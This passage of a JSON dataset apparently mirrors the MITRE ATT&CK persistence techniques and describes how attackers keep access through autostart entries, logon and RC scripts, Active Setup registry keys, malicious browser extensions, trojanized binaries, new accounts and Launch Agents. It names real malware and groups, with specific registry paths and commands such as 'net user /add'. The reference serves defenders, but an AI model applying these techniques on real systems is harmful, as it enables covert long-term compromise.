                "description": "Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user\u2019s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (.desktop) to configure the user\u2019s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.[1][2]Adversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the Exec directive in the .desktop configuration file. When the user\u2019s desktop environment is loaded at user login, the .desktop files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the /etc/xdg/autostart directory while the user entries are located in the ~/.config/autostart directory.Adversaries may combine this technique with Masquerading to blend malicious Autostart entries with legitimate programs.[3]",
                "Procedure": {
                    "S0235": {
                        "ID": "S0235",
                        "Name": "CrossRAT",
                        "Description": "<name> can use an XDG Autostart to establish persistence.[3]"
                    },
                    "S0410": {
                        "ID": "S0410",
                        "Name": "Fysbis",
                        "Description": "If executing without root privileges, <name> adds a .desktop configuration file to the user's ~/.config/autostart directory.[3][4]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> can use XDG Autostart Entries to establish persistence on Linux systems.[5]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can use an XDG Autostart to establish persistence.[3]"
                    },
                    "S1078": {
                        "ID": "S1078",
                        "Name": "RotaJakiro",
                        "Description": "When executing with user-level permissions, <name> can install persistence using a .desktop file under the $HOME/.config/autostart/ folder.[6]"
                    }
                }
            },
            "014": {
                "name": "Active Setup",
                "href": "/techniques/T1547/014",
                "description": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.[1] These programs will be executed under the context of the user and will have the account's associated permissions level.Adversaries may abuse Active Setup by creating a key under  HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\ and setting a malicious value for StubPath. This value will serve as the program that will be executed when a user logs into the computer.[2][3][4][5][6]Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "Procedure": {
                    "S0012": {
                        "ID": "S0012",
                        "Name": "PoisonIvy",
                        "Description": "<name> creates a Registry key in the Active Setup pointing to a malicious executable.[7][6][8]"
                    }
                }
            },
            "015": {
                "name": "Login Items",
                "href": "/techniques/T1547/015",
                "description": "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.[1] Login items can be added via a shared file list or Service Management Framework.[2] Shared file list login items can be set using scripting languages such as AppleScript, whereas the Service Management Framework uses the API call SMLoginItemSetEnabled.Login items installed using the Service Management Framework leverage launchd, are not visible in the System Preferences, and can only be removed by the application that created them.[2][3] Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.[4] Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.Adversaries can utilize AppleScript and Native API calls to create a login item to spawn malicious executables.[5] Prior to version 10.5 on macOS, adversaries can add login items by using AppleScript to send an Apple events to the \"System Events\" process, which has an AppleScript dictionary for manipulating login items.[6] Adversaries can use a command such as tell application \"System Events\" to make login item at end with properties /path/to/executable.[7][8][9] This command adds the path of the malicious executable to the login item file list located in ~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm.[7] Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.[10][11][12]",
                "Procedure": {
                    "S0281": {
                        "ID": "S0281",
                        "Name": "Dok",
                        "Description": "<name> uses AppleScript to install a login Item by sending Apple events to the System Events process.[8]"
                    },
                    "S0690": {
                        "ID": "S0690",
                        "Name": "Green Lambert",
                        "Description": "<name> can add Login Items to establish persistence.[13][14]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> can persist via startup options for Login items.[15]"
                    }
                }
            }
        },
        "tactic": "Persistence",
        "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.[1][2][3][4][5] These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
        "Procedure": {
            "S0651": {
                "ID": "S0651",
                "Name": "BoxCaon",
                "Description": "malware established persistence by setting the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load registry key to point to its executable.[6]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware\u2019s RAT makes a persistent target file with auto execution on the host start.[7]"
            },
            "S0084": {
                "ID": "S0084",
                "Name": "Mis-Type",
                "Description": "malware has created registry keys for persistence, including HKCU\\Software\\bkfouerioyou, HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier}, and HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier}.[8]"
            },
            "S0083": {
                "ID": "S0083",
                "Name": "Misdat",
                "Description": "malware has created registry keys for persistence, including HKCU\\Software\\dnimtsoleht\\StubPath, HKCU\\Software\\snimtsOleht\\StubPath, HKCU\\Software\\Backtsaleht\\StubPath, HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed. Components\\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7}, and HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905}.[8]"
            },
            "S0653": {
                "ID": "S0653",
                "Name": "xCaon",
                "Description": "malware has added persistence via the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load which causes the malware to run each time any user logs in.[6]"
            }
        }
    },
    "T1037": {
        "ttp_name": "Boot or Logon Initialization Scripts",
        "ttp_id": "T1037",
        "href": "/techniques/T1037",
        "subtechnique": {
            "001": {
                "name": "Logon Script (Windows)",
                "href": "/techniques/T1037/001",
                "description": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.[1] This is done via adding a path to a script to the HKCU\\Environment\\UserInitMprLogonScript Registry key.[2]Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "An <name> loader Trojan adds the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence.[3]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name>'s dispatcher can establish persistence via adding a Registry key with a logon script HKEY_CURRENT_USER\\Environment \"UserInitMprLogonScript\" .[4]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has added persistence by registering the file name for the next stage malware under HKCU\\Environment\\UserInitMprLogonScript.[5]"
                    },
                    "S0044": {
                        "ID": "S0044",
                        "Name": "JHUHUGIT",
                        "Description": "<name> has registered a Windows shell script under the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence.[6][7]"
                    },
                    "S0526": {
                        "ID": "S0526",
                        "Name": "KGH_SPY",
                        "Description": "<name> has the ability to set the HKCU\\Environment\\UserInitMprLogonScript Registry key to execute logon scripts.[8]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name> performs persistence with a logon script via adding to the Registry key HKCU\\Environment\\UserInitMprLogonScript.[9]"
                    }
                }
            },
            "002": {
                "name": "Login Hook",
                "href": "/techniques/T1037/002",
                "description": "Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the /Library/Preferences/com.apple.loginwindow.plist file and can be modified using the defaults command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.[1][2] Adversaries can add or insert a path to a malicious script in the com.apple.loginwindow.plist file, using the LoginHook or LogoutHook key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.[3][4]Note: Login hooks were deprecated in 10.11 version of macOS in favor of Launch Daemon and Launch Agent",
                "Procedure": {}
            },
            "003": {
                "name": "Network Logon Script",
                "href": "/techniques/T1037/003",
                "description": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.[1] These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
                "Procedure": {}
            },
            "004": {
                "name": "RC Scripts",
                "href": "/techniques/T1037/004",
                "description": "Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.Adversaries can establish persistence by adding a malicious binary path or shell commands to rc.local, rc.common, and other RC scripts specific to the Unix-like distribution.[1][2] Upon reboot, the system executes the script's contents as root, resulting in persistence.Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.[3]Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of Launchd. [4][5] This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.[6] To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.[7]",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has installed a run command on a compromised system to enable malware execution on system startup.[8]"
                    },
                    "S0687": {
                        "ID": "S0687",
                        "Name": "Cyclops Blink",
                        "Description": "<name> has the ability to execute on device startup, using a modified RC script named S51armled.[9]"
                    },
                    "S0690": {
                        "ID": "S0690",
                        "Name": "Green Lambert",
                        "Description": "<name> can add init.d and rc.d files in the /etc folder to establish persistence.[10][11]"
                    },
                    "S0394": {
                        "ID": "S0394",
                        "Name": "HiddenWasp",
                        "Description": "<name> installs reboot persistence by adding itself to /etc/rc.local.[2]"
                    },
                    "S0278": {
                        "ID": "S0278",
                        "Name": "iKitten",
                        "Description": "<name> adds an entry to the rc.common file for persistence.[12]"
                    }
                }
            },
            "005": {
                "name": "Startup Items",
                "href": "/techniques/T1037/005",
                "description": "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.[1]This is technically a deprecated technology (superseded by Launch Daemon), and thus the appropriate folder, /Library/StartupItems isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), StartupParameters.plist, reside in the top-level directory. An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.[2] Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",
                "Procedure": {
                    "S0283": {
                        "ID": "S0283",
                        "Name": "jRAT",
                        "Description": "<name> can list and manage startup entries.[3]"
                    }
                }
            }
        },
        "tactic": "Persistence",
        "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.[1][2] Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
        "Procedure": {
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup.[1]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware has installed an \"init.d\" startup script to maintain persistence.[2]"
            },
            "S1078": {
                "ID": "S1078",
                "Name": "RotaJakiro",
                "Description": "Depending on the Linux distribution and when executing with root permissions, malware may install persistence using a .conf file in the /etc/init/ folder.[3]"
            }
        }
    },
    "T1176": {
        "ttp_name": "Browser Extensions",
        "ttp_id": "T1176",
        "href": "/techniques/T1176",
        "tactic": "Persistence",
        "description": "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.[1][2]Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.[3] Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.Previous to macOS 11, adversaries could silently install browser extensions via the command line using the profiles tool to install malicious .mobileconfig files. In macOS 11+, the use of the profiles tool can no longer install configuration profiles, however .mobileconfig files can be planted and installed with user interaction.[4]Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.[5][6][7][8]There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for Command and Control.[9][10] Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for Defense Evasion.[11][12]",
        "Procedure": {
            "S0482": {
                "ID": "S0482",
                "Name": "Bundlore",
                "Description": "malware can install malicious browser extensions that are used to hijack user searches.[13]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can use malicious browser extensions to steal cookies and other user information.[14]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has used Google Chrome browser extensions to infect victims and to steal passwords and cookies.[15][16]"
            },
            "S1122": {
                "ID": "S1122",
                "Name": "Mispadu",
                "Description": "malware utilizes malicious Google Chrome browser extensions to steal financial data.[17]"
            },
            "S0402": {
                "ID": "S0402",
                "Name": "OSX/Shlayer",
                "Description": "malware can install malicious Safari browser extensions to serve ads.[18][19]"
            }
        }
    },
    "T1554": {
        "ttp_name": "Compromise Host Software Binary",
        "ttp_id": "T1554",
        "href": "/techniques/T1554",
        "tactic": "Persistence",
        "description": "Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.Adversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host.An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)[1] prior to the binary\u2019s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.[2]",
        "Procedure": {
            "C0025": {
                "ID": "C0025",
                "Name": "2016 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team used a trojanized version of Windows Notepad to add a layer of persistence for Industroyer.[3]"
            },
            "G1023": {
                "ID": "G1023",
                "Name": "APT5",
                "Description": "malware has modified legitimate binaries and scripts for Pulse Secure VPNs including the legitimate DSUpgrade.pm file to install the ATRIUM webshell for persistence.[4][5]"
            },
            "S0486": {
                "ID": "S0486",
                "Name": "Bonadan",
                "Description": "malware has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.[6]"
            },
            "S1118": {
                "ID": "S1118",
                "Name": "BUSHWALK",
                "Description": "malware can embed into the legitimate querymanifest.cgi file on compromised Ivanti Connect Secure VPNs.[7][8]"
            },
            "C0029": {
                "ID": "C0029",
                "Name": "Cutting Edge",
                "Description": "During malware, threat actors trojanized legitimate files in Ivanti Connect Secure appliances with malicious code.[9][10][7]"
            },
            "S0377": {
                "ID": "S0377",
                "Name": "Ebury",
                "Description": "malware has been embedded into modified OpenSSH binaries to gain persistent access to SSH credential information.[11]"
            },
            "S1120": {
                "ID": "S1120",
                "Name": "FRAMESTING",
                "Description": "malware can embed itself in the CAV Python package of an Ivanti Connect Secure VPN located in /home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg/cav/api/resources/category.py.[7]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware has used a Trojanized version of the Windows Notepad application for an additional backdoor persistence mechanism.[3]"
            },
            "S0487": {
                "ID": "S0487",
                "Name": "Kessel",
                "Description": "malware has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.[6]"
            },
            "S0641": {
                "ID": "S0641",
                "Name": "Kobalos",
                "Description": "malware replaced the SSH client with a trojanized SSH client to steal credentials on compromised systems.[12]"
            },
            "S1119": {
                "ID": "S1119",
                "Name": "LIGHTWIRE",
                "Description": "malware can imbed itself into the legitimate compcheckresult.cgi component of Ivanti Connect Secure VPNs to enable command execution.[9][7]"
            },
            "S1121": {
                "ID": "S1121",
                "Name": "LITTLELAMB.WOOLTEA",
                "Description": "malware can append malicious components to the tmp/tmpmnt/bin/samba_upgrade.tar archive inside the factory reset partition in attempt to persist post reset.[8]"
            },
            "S1104": {
                "ID": "S1104",
                "Name": "SLOWPULSE",
                "Description": "malware is applied in compromised environments through modifications to legitimate Pulse Secure files.[5]"
            },
            "S0595": {
                "ID": "S0595",
                "Name": "ThiefQuest",
                "Description": "malware searches through the /Users/ folder looking for executable files. For each executable, malware prepends a copy of itself to the beginning of the file. When the file is executed, the malware code is executed first. malware creates a hidden file, copies the original target executable to the file, then executes the new hidden file to maintain the appearance of normal behavior. [13][14]"
            },
            "S1116": {
                "ID": "S1116",
                "Name": "WARPWIRE",
                "Description": "malware can embed itself into a legitimate file on compromised Ivanti Connect Secure VPNs.[9]"
            },
            "S1115": {
                "ID": "S1115",
                "Name": "WIREFIRE",
                "Description": "malware can modify the visits.py component of Ivanti Connect Secure VPNs for file download and arbitrary command execution.[9][10]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware uses a malicious browser application to replace the legitimate browser in order to continuously capture credentials, monitor web traffic, and download additional modules.[15]"
            }
        }
    },
    "T1136": {
        "ttp_name": "Create Account",
        "ttp_id": "T1136",
        "href": "/techniques/T1136",
        "subtechnique": {
            "001": {
                "name": "Local Account",
                "href": "/techniques/T1136/001",
                "description": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. For example, with a sufficient level of access, the Windows net user /add command can be used to create a local account. On macOS systems the dscl -create command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as username, or to Kubernetes clusters using the kubectl utility.[1][2]Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
                "Procedure": {
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has been known to create or enable accounts, such as support_388945a0.[3]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has created accounts on multiple compromised hosts to perform actions within the network.[4]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> has created user accounts.[5]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has created Local Administrator accounts to maintain access to systems with short-cycle credential rotation.[6]"
                    },
                    "S0274": {
                        "ID": "S0274",
                        "Name": "Calisto",
                        "Description": "<name> has the capability to add its own account to the victim's machine.[7]"
                    },
                    "S0030": {
                        "ID": "S0030",
                        "Name": "Carbanak",
                        "Description": "<name> can create a Windows account.[8]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> creates a local user account, SafeMode, via net user commands.[9]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.[10]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> has a module for creating a local user if permissions allow.[11]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has created MS-SQL local accounts in a compromised network.[12]"
                    },
                    "S0143": {
                        "ID": "S0143",
                        "Name": "Flame",
                        "Description": "<name> can create backdoor accounts with login \"HelpAssistant\" on domain connected systems if appropriate rights are available.[13][14]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has created a local user account with administrator privileges.[15]"
                    },
                    "S0493": {
                        "ID": "S0493",
                        "Name": "GoldenSpy",
                        "Description": "<name> can create new users on an infected system.[16]"
                    },
                    "S0394": {
                        "ID": "S0394",
                        "Name": "HiddenWasp",
                        "Description": "<name> creates a user account as a means to provide initial persistence to the compromised machine.[17]"
                    },
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has created a user named \"monerodaemon\".[18]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has created accounts with net user.[19]"
                    },
                    "G0077": {
                        "ID": "G0077",
                        "Name": "Leafminer",
                        "Description": "<name> used a tool called Imecab to set up a persistent remote access account on the victim machine.[20]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has created local accounts named help and DefaultAccount on compromised machines.[21][22]"
                    },
                    "S0084": {
                        "ID": "S0084",
                        "Name": "Mis-Type",
                        "Description": "<name> may create a temporary user on the system named Lost_{Unique Identifier}.[23]"
                    },
                    "S0039": {
                        "ID": "S0039",
                        "Name": "Net",
                        "Description": "The net user username \\password commands in <name> can be used to create a local account.[24]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can user PowerView to execute \"net user\" commands and create local system accounts.[25]"
                    },
                    "S0085": {
                        "ID": "S0085",
                        "Name": "S-Type",
                        "Description": "<name> may create a temporary user on the system named Lost_{Unique Identifier} with the password pond~!@6\"{Unique Identifier}.[23]"
                    },
                    "S0382": {
                        "ID": "S0382",
                        "Name": "ServHelper",
                        "Description": "<name> has created a new user named \"supportaccount\".[26]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "<name> has created user accounts.[27]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has created local privileged users on victim machines.[28]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has created local administrator accounts to maintain persistence in compromised networks.[29]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> has a feature to create local user accounts.[30]"
                    }
                }
            },
            "002": {
                "name": "Domain Account",
                "href": "/techniques/T1136/002",
                "description": "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the net user /add /domain command can be used to create a domain account.[1]Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
                "Procedure": {
                    "C0028": {
                        "ID": "C0028",
                        "Name": "2015 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team created privileged domain accounts to be used for further exploitation and lateral movement. [2]"
                    },
                    "C0025": {
                        "ID": "C0025",
                        "Name": "2016 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team created two new accounts, \"admin\" and \"\u0441\u0438\u0441\u0442\u0435\u043c\u0430\" (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges.[3]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> has a module for creating a new domain user if permissions allow.[4]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> created high-privileged domain user accounts to maintain access to victim networks.[5][6]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has created domain accounts.[7]"
                    },
                    "S0039": {
                        "ID": "S0039",
                        "Name": "Net",
                        "Description": "The net user username \\password \\domain commands in <name> can be used to create a domain account.[1]"
                    },
                    "S0029": {
                        "ID": "S0029",
                        "Name": "PsExec",
                        "Description": "<name> has the ability to remotely create accounts on target systems.[8]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can user PowerView to execute \"net user\" commands and create domain accounts.[9]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has created and used new accounts within a victim's Active Directory environment to maintain persistence.[10]"
                    }
                }
            },
            "003": {
                "name": "Cloud Account",
                "href": "/techniques/T1136/003",
                "description": "Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.[1][2][3][4][5]In addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment.[6] In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for Temporary Elevated Cloud Access.[7] While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.[8][9]Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding Additional Cloud Credentials or assigning Additional Cloud Roles.",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can create new Azure AD users.[10]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> can create new users through Azure AD.[11]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has created global admin accounts in the targeted organization's cloud instances to gain persistence.[12]"
                    }
                }
            }
        },
        "tactic": "Persistence",
        "description": "Adversaries may create an account to maintain access to victim systems.[1] With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",
        "Procedure": {
            "C0025": {
                "ID": "C0025",
                "Name": "2016 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team added a login to a SQL Server with sp_addlinkedsrvlogin.[2]"
            },
            "G0119": {
                "ID": "G0119",
                "Name": "Indrik Spider",
                "Description": "malware used wmic.exe to add a new user to the system.[1]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware creates new user identities within the compromised organization.[3]"
            }
        }
    },
    "T1543": {
        "ttp_name": "Create or Modify System Process",
        "ttp_id": "T1543",
        "href": "/techniques/T1543",
        "subtechnique": {
            "001": {
                "name": "Launch Agent",
                "href": "/techniques/T1543/001",
                "description": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in /System/Library/LaunchAgents, /Library/LaunchAgents, and ~/Library/LaunchAgents.[1][2] [3] Property list files use the Label, ProgramArguments , and RunAtLoad keys to identify the Launch Agent's name, executable location, and execution time.[4] Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.Launch Agents can also be executed using the Launchctl command.Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the RunAtLoad or KeepAlive keys set to true.[5][6] The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.[7][8]",
                "Procedure": {
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> can persist via a LaunchAgent.[9]"
                    },
                    "S0274": {
                        "ID": "S0274",
                        "Name": "Calisto",
                        "Description": "<name> adds a .plist file to the /Library/LaunchAgents folder to maintain persistence.[10]"
                    },
                    "S0369": {
                        "ID": "S0369",
                        "Name": "CoinTicker",
                        "Description": "<name> creates user launch agents named .espl.plist and com.apple.[random string].plist to establish persistence.[11]"
                    },
                    "S0492": {
                        "ID": "S0492",
                        "Name": "CookieMiner",
                        "Description": "<name> has installed multiple new Launch Agents in order to maintain persistence for cryptocurrency mining software.[12]"
                    },
                    "S0235": {
                        "ID": "S0235",
                        "Name": "CrossRAT",
                        "Description": "<name> creates a Launch Agent on macOS.[13]"
                    },
                    "S0497": {
                        "ID": "S0497",
                        "Name": "Dacls",
                        "Description": "<name> can establish persistence via a LaunchAgent.[14][15]"
                    },
                    "S0281": {
                        "ID": "S0281",
                        "Name": "Dok",
                        "Description": "<name> installs two LaunchAgents to redirect all network traffic with a randomly generated name for each plist file maintaining the format com.random.name.plist.[16][17]"
                    },
                    "S0277": {
                        "ID": "S0277",
                        "Name": "FruitFly",
                        "Description": "<name> persists via a Launch Agent.[16]"
                    },
                    "S0690": {
                        "ID": "S0690",
                        "Name": "Green Lambert",
                        "Description": "<name> can create a Launch Agent with the RunAtLoad key-value pair set to true, ensuring the com.apple.GrowlHelper.plist file runs every time a user logs in.[18][19]"
                    },
                    "S0276": {
                        "ID": "S0276",
                        "Name": "Keydnap",
                        "Description": "<name> uses a Launch Agent to persist.[20]"
                    },
                    "S0162": {
                        "ID": "S0162",
